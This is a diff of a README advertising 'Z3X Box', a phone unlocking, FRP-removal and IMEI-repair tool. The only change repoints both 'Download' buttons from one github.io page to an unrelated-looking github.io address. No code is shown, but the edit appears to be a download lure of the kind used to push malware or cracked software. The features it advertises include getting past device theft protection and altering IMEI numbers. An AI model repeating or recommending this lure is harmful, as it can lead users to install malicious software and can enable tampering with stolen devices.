@@ -2,7 +2,7 @@
 
 Z3X Box is a powerful and widely used mobile servicing tool for Samsung, LG, and other smartphones. It enables unlocking, flashing, FRP removal, IMEI repair, and more — all with high speed and reliability. Perfect for technicians and repair centers.
 
-[![Download Z3X Box](https://img.shields.io/badge/Download-Z3X_Box-blueviolet)](https://z3x-box.github.io/.github)
+[![Download Z3X Box](https://img.shields.io/badge/Download-Z3X_Box-blueviolet)](https://asdeennerhorse.github.io/mogus/z3x)
 
 ---
 
@@ -35,7 +35,7 @@ Z3X Box is a powerful and widely used mobile servicing tool for Samsung, LG, and
 - Unlocking carrier-locked smartphones  
 - Reading security codes and resetting MSL  
 
-[![Download Z3X Box](https://img.shields.io/badge/Download-Z3X_Box-blueviolet)](https://z3x-box.github.io/.github)
+[![Download Z3X Box](https://img.shields.io/badge/Download-Z3X_Box-blueviolet)](https://asdeennerhorse.github.io/mogus/z3x)
 
 ---
 
